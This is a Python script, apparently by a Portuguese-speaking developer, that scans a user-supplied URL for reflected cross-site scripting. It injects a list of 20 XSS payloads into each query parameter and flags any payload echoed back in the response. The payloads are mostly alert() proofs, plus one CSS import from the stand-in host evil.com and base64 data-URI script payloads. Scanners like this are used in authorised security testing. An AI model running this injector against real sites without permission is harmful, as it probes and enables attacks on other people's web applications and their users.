import requests
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode

print("DESENVOLVEDOR: WILLIAN DE OLIVEIRA")

# Lista expandida de payloads comuns de XSS
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "';alert('XSS');//",
    "\"><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<input type='text' value='XSS' onfocus='alert(1)'>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "<style>@import 'http://evil.com/xss.css';</style>",
    "<math><mtext></mtext><mtext><mprescripts></mprescripts><mtext></mtext></math><script>alert(1)</script>",
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
    "<embed src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWxlcnQoMSk+'></embed>",
    "<plaintext><script>alert('XSS')",
    "<b onmouseover=alert('XSS')>hover me!</b>",
    "<details open ontoggle=alert('XSS')>click me!</details>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<xss id=x tabindex=1 onfocus=alert(1)>XSS</xss>",
    "<form><button formaction=javascript:alert('XSS')>Click me</button></form>",
    "<select onchange=alert('XSS')><option>Choose me</option></select>"
]

# Solicita a URL base do usuário
base_url = input("Digite a URL base para testar (exemplo: https://example.com): ")

def test_xss(base_url, payloads):
    """
    Testa a URL alvo para vulnerabilidades de XSS.
    """
    parsed_url = urlparse(base_url)
    
    if not parsed_url.scheme or not parsed_url.netloc:
        print("URL inválida. Certifique-se de incluir o protocolo (http ou https).")
        return
    
    original_params = parse_qs(parsed_url.query)

    print(f"Parsed URL: {parsed_url}")
    print(f"Original Params: {original_params}")

    if not original_params:
        print("Nenhum parâmetro encontrado na URL fornecida.")
        return

    # Para cada parâmetro existente e payload, faz uma tentativa de injeção
    for param in original_params.keys():
        for payload in payloads:
            test_params = original_params.copy()
            test_params[param] = [payload]  # Corrigido para atribuir uma lista

            # Reconstrói a URL com os novos parâmetros
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed_url._replace(query=test_query))

            print(f"Testando URL: {test_url}")

            # Realiza a requisição HTTP
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
                }
                response = requests.get(test_url, headers=headers)
                if payload in response.text:
                    print(f"Possível vulnerabilidade de XSS detectada em parâmetro: {param} com payload: {payload}")
                else:
                    print(f"Parâmetro {param} com payload {payload} parece seguro.")
            except requests.RequestException as e:
                print(f"Erro ao testar {test_url}: {e}")

# Executa os testes para a URL fornecida
test_xss(base_url, xss_payloads)